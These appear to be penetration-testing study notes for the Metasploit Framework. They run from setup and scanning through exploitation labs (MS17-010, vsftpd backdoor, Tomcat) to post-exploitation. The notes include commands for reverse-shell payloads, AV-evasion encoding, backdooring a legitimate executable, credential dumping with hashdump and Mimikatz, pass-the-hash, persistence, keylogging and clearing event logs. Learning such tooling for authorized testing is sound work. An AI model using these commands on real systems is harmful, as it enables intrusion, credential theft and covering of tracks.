
---

### Metasploit Framework Overview

#### Introduction

- Metasploit Framework (MSF) is an open-source penetration testing platform.
    
- Automates various tasks in a penetration test.
    
- Hosts the largest database of verified exploits.
    
- Available interfaces:
    
    - MSF Console (CLI)
        
    - MSF Community Edition (Web)
        
    - Armitage (GUI)
        

#### Terminology

- **Module**: Reusable code blocks.
    
- **Exploit**: Takes advantage of a vulnerability.
    
- **Payload**: Code executed post-exploitation.
    
- **Auxiliary**: Non-exploit functions (e.g., scanners).
    
- **Encoder**: Obfuscates payloads.
    
- **NOP**: Ensures payload stability.
    

#### Architecture Overview

Modules are stored in:

```
/usr/share/metasploit-framework/modules/
```

Includes:

- Exploits
    
- Payloads
    
- Encoders
    
- NOP generators
    
- Post modules
    
- Auxiliary modules
    

---

### Penetration Testing with MSF

- MSF supports all phases of the [Penetration Testing Execution Standard (PTES)](https://github.com/penetration-testing-execution-standard).
    

---

### Metasploit Fundamentals

#### Installation

```
sudo apt update && sudo apt install metasploit-framework -y
sudo systemctl enable postgresql
sudo systemctl start postgresql
sudo msfdb init
```

#### MSF Console Basics

```
msf6 > search <term>
msf6 > use <module>
msf6 > show options
msf6 > set RHOSTS <IP>
msf6 > set LHOST <IP>
msf6 > set LPORT <PORT>
msf6 > run / exploit
```

#### Session Management

```
msf6 > sessions
msf6 > sessions -i <ID>
msf6 > background
```

#### Workspaces

```
msf6 > workspace -a <name>
msf6 > workspace <name>
msf6 > workspace -r <old> <new>
```

---

### Scanning and Enumeration

#### Nmap Integration

```
nmap -sV -Pn -O <TargetIP> -oX scan.xml
msf6 > db_import scan.xml
msf6 > db_nmap -sV -Pn <TargetIP>
```

#### Auxiliary Scanning Modules

```
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > use auxiliary/scanner/http/http_version
msf6 > use auxiliary/scanner/ftp/ftp_login
```

#### SMB Enumeration

```
msf6 > use auxiliary/scanner/smb/smb_enumusers
msf6 > use auxiliary/scanner/smb/smb_enumshares
```

#### Web Enumeration

```
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 > use auxiliary/scanner/http/http_login
```

#### MySQL Enumeration

```
msf6 > use auxiliary/scanner/mysql/mysql_login
```

#### SSH Enumeration

```
msf6 > use auxiliary/scanner/ssh/ssh_login
```

#### SMTP Enumeration

```
msf6 > use auxiliary/scanner/smtp/smtp_enum
```

---

### Vulnerability Scanning

#### With MSF

```
msf6 > db_nmap -sV -O <TargetIP>
searchsploit "Service Name" | grep Metasploit
```

#### With Nessus

```
msf6 > db_import nessus_scan.xml
msf6 > vulns
msf6 > search cve:<year>
```

#### With WMAP (Web Apps)

```
msf6 > load wmap
msf6 > wmap_sites -a <TargetIP>
msf6 > wmap_targets -t http://<TargetIP>
msf6 > wmap_run -t
msf6 > wmap_vulns
```

---

### Payloads with Msfvenom

#### Generating Payloads

```
msfvenom --list payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

#### Encoding Payloads

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -i 10 -f exe > encoded.exe
```

#### Injecting Payloads

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -k -x legitimate.exe -f exe > backdoored.exe
```

#### Starting a Listener

```
msf6 > use multi/handler
msf6 > set payload <payload>
msf6 > run
```

---

### Automation with Resource Scripts

```
msfconsole -r <script.rc>
msf6 > resource /path/to/script.rc
```

---

### Exploitation Labs

#### Rejetto HFS

```
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 > set payload windows/x64/meterpreter/reverse_tcp
```

#### MS17-010

```
msf6 > use exploit/windows/smb/ms17_010_psexec
```

#### Apache Tomcat

```
msf6 > use exploit/multi/http/tomcat_jsp_upload_bypass
msf6 > set payload java/jsp_shell_bind_tcp
```

#### VSFTPD

```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
```

#### Samba (Pipename)

```
msf6 > use exploit/linux/samba/is_known_pipename
```

#### SSH Libssh

```
msf6 > use auxiliary/scanner/ssh/libssh_auth_bypass
```

#### SMTP Haraka

```
msf6 > use exploit/linux/smtp/haraka
```

---

### Post-Exploitation with Meterpreter

```
meterpreter > help
meterpreter > download <file>
meterpreter > search -d <dir> <filename>
meterpreter > shell
```

#### Upgrade Shell

```
msf6 > use post/multi/manage/shell_to_meterpreter
```

---

### Windows Post Exploitation

#### Modules

```
meterpreter > getsystem
meterpreter > hashdump
msf6 > use post/windows/gather/enum_logged_on_users
msf6 > use post/windows/gather/win_privs
```

#### UAC Bypass

```
msf6 > use exploit/windows/local/bypassuac_injection
```

#### Token Impersonation

```
meterpreter > load incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "Name"
```

#### Mimikatz

```
meterpreter > load kiwi
meterpreter > creds_all
```

#### Pass-the-Hash with PsExec

```
msf6 > use exploit/windows/smb/psexec
set SMBUser <user>
set SMBPass <NTLM hash>
```

#### Persistence

```
msf6 > use exploit/windows/local/persistence_service
```

#### Enable RDP

```
msf6 > use post/windows/manage/enable_rdp
```

#### Keylogging

```
meterpreter > keyscan_start
meterpreter > keyscan_dump
```

#### Clearing Tracks

```
meterpreter > clearev
```

#### Pivoting

```
meterpreter > run autoroute -s <subnet>
msf6 > use auxiliary/scanner/portscan/tcp
meterpreter > portfwd add -l <localPort> -p <targetPort> -r <TargetIP>
```

---

### Linux Post Exploitation

#### Modules

```
msf6 > use post/linux/gather/enum_config
msf6 > use post/linux/gather/enum_network
msf6 > use post/linux/gather/enum_users_history
```

#### Privilege Escalation

```
msf6 > use exploit/unix/local/chkrootkit
```

#### Hashdump

```
msf6 > use post/linux/gather/hashdump
```

#### Persistence

```
msf6 > use exploit/linux/local/cron_persistence
msf6 > use post/linux/manage/sshkey_persistence
```

---

### GUI with Armitage

- Armitage provides a graphical interface for MSF.
    
- Supports visualization, automated scanning, exploitation, and post-exploitation.
    
- Requires PostgreSQL and Metasploit backend services.
    

---

